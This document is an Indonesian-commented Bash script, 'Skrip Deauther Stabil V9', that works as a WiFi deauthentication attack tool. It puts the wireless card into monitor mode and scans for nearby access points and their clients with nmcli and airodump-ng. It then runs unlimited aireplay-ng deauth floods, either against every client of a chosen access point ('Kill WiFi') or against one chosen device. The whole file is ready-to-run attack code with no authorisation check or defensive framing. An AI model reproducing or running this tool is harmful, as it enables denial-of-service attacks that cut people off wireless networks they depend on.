#!/bin/bash

# =================================================================
# Skrip Deauther Stabil V9: Solusi FINAL Detasemen Proses (Menggunakan nohup)
# Fitur: Menyembunyikan semua pesan debug Tilix/Terminator.
# =================================================================

# --- DEKLARASI WARNA ANSI ---
CYAN='\033[96m'
GREEN='\033[92m'
YELLOW='\033[93m'
RED='\033[91m'
NC='\033[0m' # No Color

WIFI_INTERFACE="wlan0"
MON_INTERFACE=""
BSSID_TARGET=""
TARGET_CH=""
SSID_TARGET="[Tidak Dikenali]"
DEAUTH_COUNT="0"

# --- FUNGSI UTILITY ---

function check_prereqs() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}[!]${NC} Skrip ini harus dijalankan sebagai root (gunakan sudo)." 
        exit 1
    fi
    if ! command -v tilix &> /dev/null; then
        echo -e "${RED}[!]${NC} Program 'tilix' (untuk scan AP) tidak ditemukan. Silakan install: sudo apt install tilix"
        exit 1
    fi
    if ! command -v terminator &> /dev/null; then
        echo -e "${RED}[!]${NC} Program 'terminator' (untuk scan Klien) tidak ditemukan. Silakan install: sudo apt install terminator"
        exit 1
    fi
}

function cleanup() {
    echo -e "\n\n${YELLOW}[*]${NC} Mengembalikan interface ke mode terkelola..."
    
    if [ -n "$MON_INTERFACE" ] && ip link show "$MON_INTERFACE" &> /dev/null; then
        airmon-ng stop "$MON_INTERFACE" > /dev/null 2>&1
    fi

    sudo ip link set "$WIFI_INTERFACE" down > /dev/null 2>&1
    sudo iwconfig "$WIFI_INTERFACE" mode managed > /dev/null 2>&1
    sudo ip link set "$WIFI_INTERFACE" up > /dev/null 2>&1

    echo -e "${YELLOW}[*]${NC} Memastikan NetworkManager aktif dan restart..."
    sudo systemctl start NetworkManager > /dev/null 2>&1
    sudo systemctl restart NetworkManager > /dev/null 2>&1
    service network-manager start > /dev/null 2>&1 
    
    echo -e "${GREEN}[+]${NC} Pembersihan selesai. Interface ${CYAN}$WIFI_INTERFACE${NC} sudah kembali normal."
    exit 0
}

function stop_network_services() {
    echo -e "\n${YELLOW}[*]${NC} Menghentikan proses yang mengganggu..."
    airmon-ng check kill > /dev/null 2>&1
    sleep 1
}

function set_monitor_mode() {
    stop_network_services

    echo -e "${YELLOW}[*]${NC} Mengatur interface ${CYAN}$WIFI_INTERFACE${NC} ke mode monitor..."
    airmon-ng start "$WIFI_INTERFACE" > /dev/null 2>&1
    MON_INTERFACE="${WIFI_INTERFACE}mon"
    
    if ! ip link show "$MON_INTERFACE" &> /dev/null; then
        echo -e "${RED}[!]${NC} Gagal membuat interface monitor."
        cleanup
    fi
    echo -e "${GREEN}[+]${NC} Interface monitor aktif: ${CYAN}$MON_INTERFACE${NC}"
}

# --- FUNGSI INTI ---

function scan_and_get_target() {
    echo -e "\n${CYAN}=================================================${NC}"
    echo -e "${YELLOW}[PERHATIAN]${NC} Jendela Tilix Baru akan Terbuka untuk Scan NMCLI..."
    echo -e "${CYAN}=================================================${NC}"
    echo -e " ${CYAN}- ${NC}Lihat jendela Tilix. Catat BSSID dan CHANNEL Target."
    echo -e " ${CYAN}- ${NC}Tutup jendela Tilix, lalu kembali ke terminal ini untuk input."
    echo -e " ${CYAN}- ${NC}Ketik '0' untuk keluar dan membersihkan (Cleanup Total)."
    echo -e "${CYAN}=================================================${NC}"
    
    # KOREKSI PENTING: Menggunakan 'nohup' dan '&> /dev/null' untuk detasemen penuh
    nohup tilix -t "WIFI SCANNER: nmcli device wifi list" -e "nmcli device wifi list" &> /dev/null &
    
    # --- INPUT BSSID ---
    while true; do
        read -p "Masukkan BSSID yang ada di Tilix (atau ketik 0 untuk keluar): " INPUT_BSSID
        if [ "$INPUT_BSSID" == "0" ]; then
            cleanup
        elif [ -n "$INPUT_BSSID" ]; then
            BSSID_TARGET="$INPUT_BSSID"
            break
        else
            echo -e "${RED}[!]${NC} BSSID tidak boleh kosong."
        fi
    done

    # Coba ambil SSID 
    SSID_TARGET=$(nmcli dev wifi list | awk -v mac="$BSSID_TARGET" '$1 == mac {print $NF; exit}')
    
    # --- INPUT CHANNEL ---
    while true; do
        read -p "Masukkan Channel Target (Contoh: 6): " INPUT_CH
        if [[ "$INPUT_CH" =~ ^[0-9]+$ ]] && [ "$INPUT_CH" -ge 1 ] && [ "$INPUT_CH" -le 165 ]; then
            TARGET_CH="$INPUT_CH"
            break
        else
            echo -e "${RED}[!]${NC} Input channel tidak valid."
        fi
    done
    
    set_monitor_mode
}

function get_client_input() {
    echo -e "\n${CYAN}=================================================${NC}"
    echo -e "${YELLOW}[PERHATIAN]${NC} Jendela TERMINATOR Baru akan Terbuka untuk Scan Klien..."
    echo -e "${CYAN}=================================================${NC}"
    echo -e " ${CYAN}- ${NC}Gunakan ${YELLOW}Ctrl+Shift+C${NC} untuk Menyalin MAC Klien."
    echo -e " ${CYAN}- ${NC}Scan ${RED}HANYA${NC} berjalan 10 detik. Hasilnya akan tetap ada."
    echo -e " ${CYAN}- ${NC}Tutup jendela Terminator secara manual setelah mencatat MAC Klien."
    echo -e " ${CYAN}- ${NC}Kembali ke terminal ini untuk input MAC Klien."
    echo -e "${CYAN}=================================================${NC}"
    
    # KOREKSI PENTING: Menggunakan 'nohup' dan '&> /dev/null' untuk detasemen penuh
    nohup terminator --title="KLIEN SCANNER: Airodump-ng 10s" -e "sudo timeout 10s airodump-ng --bssid $BSSID_TARGET $MON_INTERFACE; echo ' '; echo 'Scan Airodump-ng selesai. Jendela ini tidak akan menutup.'; echo ' '; exec bash -i" &> /dev/null &

    sleep 1
    
    while true; do
        read -p "Masukkan MAC Klien Target (MAC pada baris 'Station' Airodump) atau '0' untuk batal: " INPUT_CLIENT_MAC
        if [ "$INPUT_CLIENT_MAC" == "0" ]; then
            select_attack_mode 
        elif [ -n "$INPUT_CLIENT_MAC" ]; then
            CLIENT_MAC="$INPUT_CLIENT_MAC"
            break
        else
            echo -e "${RED}[!]${NC} MAC Klien tidak boleh kosong."
        fi
    done
    launch_deauth_attack "$BSSID_TARGET" "$CLIENT_MAC"
}

function select_attack_mode() {
    local DISPLAY_TARGET
    if [ "$SSID_TARGET" != "[Tidak Dikenali]" ]; then
        DISPLAY_TARGET="$SSID_TARGET ($BSSID_TARGET)"
    else
        DISPLAY_TARGET="$BSSID_TARGET"
    fi

    echo -e "\n${CYAN}[*]${NC} Memilih Mode Serangan untuk AP: ${GREEN}$DISPLAY_TARGET${NC} di Channel ${YELLOW}$TARGET_CH${NC}:"
    echo -e "  ${CYAN}1) Kill WiFi${NC} (Deauth Semua Klien)"
    echo -e "  ${CYAN}2) Target Personal${NC} (Deauth Klien Tertentu) - ${YELLOW}MEMBUTUHKAN SCAN Airodump-ng${NC}"
    echo -e "  ${CYAN}0) Keluar${NC} dan Bersihkan Interface"
    
    read -p "Pilih opsi [0-2]: " ATTACK_CHOICE
    
    case "$ATTACK_CHOICE" in
        1)
            launch_deauth_attack "$BSSID_TARGET" ""
            ;;
        2)
            get_client_input
            ;;
        0)
            cleanup 
            ;;
        *)
            echo -e "${RED}[!]${NC} Pilihan tidak valid."
            select_attack_mode
            ;;
    esac
}


function launch_deauth_attack() {
    local AP_MAC=$1
    local CLIENT_MAC=$2
    
    echo -e "${YELLOW}[*]${NC} Mengatur ${CYAN}$MON_INTERFACE${NC} ke Channel ${YELLOW}$TARGET_CH${NC}..."
    iwconfig "$MON_INTERFACE" channel "$TARGET_CH" > /dev/null 2>&1
    echo -e "${GREEN}[+]${NC} Channel diatur ke ${YELLOW}$TARGET_CH${NC}."


    echo -e "\n${RED}-----------------------------------------------------${NC}"
    if [ -z "$CLIENT_MAC" ]; then
        echo -e "${RED}!!! Meluncurkan serangan DEAUTH PENUH (Kill WiFi). !!!${NC}"
        echo -e "[TARGET AP] BSSID: ${GREEN}$AP_MAC${NC}"
        echo "[PERINTAH] aireplay-ng -0 $DEAUTH_COUNT -a $AP_MAC $MON_INTERFACE"
    else
        echo -e "${RED}!!! Meluncurkan serangan DEAUTH PERSONAL. !!!${NC}"
        echo -e "[TARGET AP] BSSID: ${GREEN}$AP_MAC${NC}"
        echo -e "[TARGET KLIEN] MAC: ${GREEN}$CLIENT_MAC${NC}"
        echo "[PERINTAH] aireplay-ng -0 $DEAUTH_COUNT -a $AP_MAC -c $CLIENT_MAC $MON_INTERFACE"
    fi
    echo -e "${YELLOW}[*]${NC} Tekan ${RED}Ctrl+C${NC} untuk menghentikan serangan dan membersihkan."
    echo -e "${RED}-----------------------------------------------------${NC}"
    
    if [ -z "$CLIENT_MAC" ]; then
        aireplay-ng -0 "$DEAUTH_COUNT" -a "$AP_MAC" "$MON_INTERFACE"
    else
        aireplay-ng -0 "$DEAUTH_COUNT" -a "$AP_MAC" -c "$CLIENT_MAC" "$MON_INTERFACE"
    fi
}

# --- ALIRAN UTAMA SKRIP ---
trap cleanup SIGINT SIGTERM

check_prereqs
scan_and_get_target 
select_attack_mode
